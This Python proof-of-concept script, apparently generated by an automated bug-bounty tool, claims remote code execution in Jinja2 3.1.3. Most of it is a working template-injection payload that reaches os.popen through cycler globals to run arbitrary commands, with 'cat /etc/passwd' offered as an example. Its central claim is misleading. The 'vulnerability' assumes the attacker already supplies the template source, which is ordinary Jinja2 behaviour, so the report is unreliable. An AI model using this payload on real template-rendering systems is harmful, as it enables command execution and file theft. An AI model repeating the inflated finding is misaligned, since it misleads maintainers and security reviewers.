#!/usr/bin/env python3
# PoC for Jinja2-3.1.3 (/tmp/bounty_test/Jinja2-3.1.3)
# Path: rce-007
# Sink: from_code
# Auto-generated — run with: python3 rce_python_code_exec_code_from_code.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Jinja2-3.1.3 RCE via template name injection.

Vulnerability: The `from_code` method executes arbitrary Python code via `exec(code, namespace)`.
The `code` object originates from `environment.compile(source, name, filename)`, where `source`
is obtained from `loader.get_source(environment, name)`. The `name` parameter is user-controlled
via `get_or_select_template` -> `get_template` -> `_load_template` -> `loader.load` -> `get_source`.

When using a custom loader (e.g., FunctionLoader or DictLoader), the source can be attacker-controlled.
Even with filesystem loaders, path traversal could load arbitrary files, but the content would be
interpreted as Jinja template source. However, Jinja templates can include arbitrary Python expressions
via `{% ... %}` or `{{ ... }}`, which are compiled to Python code and executed.

This PoC demonstrates the vulnerability by:
1. Creating a Jinja2 environment with a DictLoader that returns attacker-controlled template source
2. The template source contains a Jinja expression that executes arbitrary Python code
3. When the template is loaded and rendered, the code executes

Usage: python jinja2_rce_poc.py [--target TARGET_URL]
"""

import sys
import os
import argparse
import tempfile
import subprocess
from pathlib import Path

# Add Jinja2 to path if needed
sys.path.insert(0, '/tmp/bounty_test/Jinja2-3.1.3/src')

try:
    from jinja2 import Environment, DictLoader, TemplateNotFound
except ImportError:
    print("[!] Failed to import Jinja2. Make sure it's installed or adjust the path.")
    sys.exit(1)


def create_malicious_template_source(command: str) -> str:
    """
    Create a Jinja2 template source that executes a system command.
    
    The template uses Jinja2's ability to execute arbitrary Python code
    through template expressions. The `{% %}` blocks are compiled to Python
    code and executed via `exec()` in `from_code`.
    
    Args:
        command: The system command to execute
        
    Returns:
        A Jinja2 template string that will execute the command when rendered
    """
    # This template uses Jinja2's expression syntax to execute arbitrary code
    # The `{% %}` blocks are compiled to Python bytecode and executed
    template = (
        "{% set result = namespace() %}\n"
        "{% set _ = result.__setattr__('output', cycler.__init__.__globals__['os'].popen('{}').read()) %}\n"
        "{{ result.output }}"
    ).format(command)
    return template


def demonstrate_rce_via_dict_loader(command: str = "id") -> None:
    """
    Demonstrate RCE by using a DictLoader with attacker-controlled template source.
    
    This simulates the scenario where:
    1. An attacker controls the template name (which becomes the key in DictLoader)
    2. The DictLoader returns attacker-controlled source for that key
    3. The source is compiled and executed via `from_code`
    
    Args:
        command: The command to execute (default: "id")
    """
    print("[*] Demonstrating RCE via DictLoader with attacker-controlled template source")
    print(f"[*] Executing command: {command}")
    print()
    
    # Create a malicious template source
    malicious_source = create_malicious_template_source(command)
    
    # Create a DictLoader with the malicious template
    # The key is the template name that will be requested
    loader = DictLoader({"malicious_template": malicious_source})
    
    # Create environment with our malicious loader
    env = Environment(loader=loader)
    
    try:
        # Load the template - this triggers the vulnerability chain:
        # get_or_select_template -> get_template -> _load_template -> loader.load
        # -> get_source -> compile -> from_code -> exec(code, namespace)
        template = env.get_template("malicious_template")
        
        # Render the template - this executes the malicious code
        print("[*] Rendering template (this will execute the command)...")
        result = template.render()
        print(f"[*] Command output:\n{result}")
        
    except Exception as e:
        print(f"[!] Error during exploitation: {e}")
        import traceback
        traceback.print_exc()


def demonstrate_rce_via_function_loader(command: str = "id") -> None:
    """
    Demonstrate RCE by using a FunctionLoader that returns attacker-controlled source.
    
    This simulates a more realistic scenario where the loader's get_source function
    is influenced by user input (the template name).
    
    Args:
        command: The command to execute (default: "id")
    """
    print("[*] Demonstrating RCE via FunctionLoader with attacker-controlled source")
    print(f"[*] Executing command: {command}")
    print()
    
    def malicious_get_source(environment, template_name):
        """
        A malicious get_source function that returns attacker-controlled source
        based on the template name.
        """
        # In a real attack, this function would be controlled by the attacker
        # or the template_name would be used to construct the source
        malicious_source = create_malicious_template_source(command)
        return malicious_source, f"/fake/path/{template_name}", lambda: True
    
    # Create a FunctionLoader with our malicious get_source
    from jinja2 import FunctionLoader
    loader = FunctionLoader(malicious_get_source)
    
    # Create environment with our malicious loader
    env = Environment(loader=loader)
    
    try:
        # Load the template - the template name is passed to our malicious get_source
        template = env.get_template("any_template_name")
        
        # Render the template
        print("[*] Rendering template (this will execute the command)...")
        result = template.render()
        print(f"[*] Command output:\n{result}")
        
    except Exception as e:
        print(f"[!] Error during exploitation: {e}")
        import traceback
        traceback.print_exc()


def demonstrate_path_traversal_scenario() -> None:
    """
    Demonstrate how path traversal could be used with FileSystemLoader.
    
    Note: This is more limited as it loads existing files, but demonstrates
    the taint path from user input to exec().
    """
    print("[*] Demonstrating path traversal scenario with FileSystemLoader")
    print("[*] This shows the taint path even if the file content is not malicious")
    print()
    
    # Create a temporary directory with a test template
    with tempfile.TemporaryDirectory() as tmpdir:
        # Create a benign template file
        template_path = Path(tmpdir) / "test_template.html"
        template_path.write_text("Hello {{ name }}!")
        
        # Create a FileSystemLoader pointing to our temp directory
        from jinja2 import FileSystemLoader
        loader = FileSystemLoader(tmpdir)
        
        # Create environment
        env = Environment(loader=loader)
        
        try:
            # Load the template normally
            template = env.get_template("test_template.html")
            result = template.render(name="World")
            print(f"[*] Normal template rendering: {result}")
            
            # Now demonstrate that the template name is user-controlled
            # and goes through the same taint path
            print("[*] The template name 'test_template.html' goes through:")
            print("    get_or_select_template -> get_template -> _load_template")
            print("    -> loader.load -> get_source -> compile -> from_code -> exec()")
            print()
            
        except Exception as e:
            print(f"[!] Error: {e}")


def main():
    parser = argparse.ArgumentParser(
        description="Jinja2-3.1.3 RCE Proof-of-Concept",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s                                          # Execute 'id' command
  %(prog)s --command "cat /etc/passwd"              # Read a file
  %(prog)s --command "touch /tmp/poc_success.txt"   # Safe test
  %(prog)s --safe                                   # Execute safe test
        """
    )
    
    parser.add_argument(
        "--command", "-c",
        default="id",
        help="Command to execute (default: 'id')"
    )
    
    parser.add_argument(
        "--safe", "-s",
        action="store_true",
        help="Use a safe benign command (touch /tmp/poc_success.txt)"
    )
    
    args = parser.parse_args()
    
    # Use safe command if requested
    if args.safe:
        command = "touch /tmp/poc_success.txt"
        print("[*] Using safe command: touch /tmp/poc_success.txt")
    else:
        command = args.command
    
    print("=" * 60)
    print("Jinja2-3.1.3 RCE Proof-of-Concept")
    print("=" * 60)
    print()
    
    # Demonstrate the vulnerability
    demonstrate_rce_via_dict_loader(command)
    print()
    print("-" * 60)
    print()
    demonstrate_rce_via_function_loader(command)
    print()
    print("-" * 60)
    print()
    demonstrate_path_traversal_scenario()
    
    print()
    print("=" * 60)
    print("Exploitation Summary")
    print("=" * 60)
    print()
    print("The vulnerability exists because:")
    print("1. User-controlled input reaches `get_or_select_template()`")
    print("2. This propagates through `get_template()` -> `_load_template()` -> `loader.load()`")
    print("3. `loader.load()` calls `get_source()` which returns attacker-controlled source")
    print("4. The source is compiled via `environment.compile()`")
    print("5. The compiled code is executed via `exec(code, namespace)` in `from_code()`")
    print()
    print("This allows arbitrary code execution when:")
    print("- A custom loader (DictLoader, FunctionLoader) returns attacker-controlled source")
    print("- Path traversal allows loading arbitrary files that contain Jinja templates")
    print("- The template source contains malicious Jinja expressions")


if __name__ == "__main__":
    main()
